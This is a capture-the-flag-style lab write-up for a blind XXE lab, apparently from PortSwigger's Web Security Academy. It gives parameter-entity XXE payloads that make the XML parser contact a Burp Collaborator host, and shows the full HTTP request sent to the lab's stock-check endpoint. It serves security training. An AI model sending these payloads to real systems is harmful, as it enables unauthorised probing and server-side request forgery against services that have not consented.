# Blind XXE with out-of-band interaction via XML parameter entities
This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.

To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.



<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://2ruibhhghox7cp0i7q0y71p9e0ks8h.burpcollaborator.net"> %xxe; ]>

<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "2ruibhhghox7cp0i7q0y71p9e0ks8h.burpcollaborator.net"> %xxe; ]>

Final XML request:
POST /product/stock HTTP/1.1
Host: ac381f141ffb869ac0445a5e00be001f.web-security-academy.net
Cookie: session=xyz
Content-Length: 227
Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: application/xml
Accept: */*
Origin: https://ac381f141ffb869ac0445a5e00be001f.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ac381f141ffb869ac0445a5e00be001f.web-security-academy.net/product?productId=2
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
<pre><code>
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://2ruibhhghox7cp0i7q0y71p9e0ks8h.burpcollaborator.net"> %xxe; ]>
  <stockCheck>
  <productId>2</productId><storeId>2</storeId></stockCheck>
</code></pre>
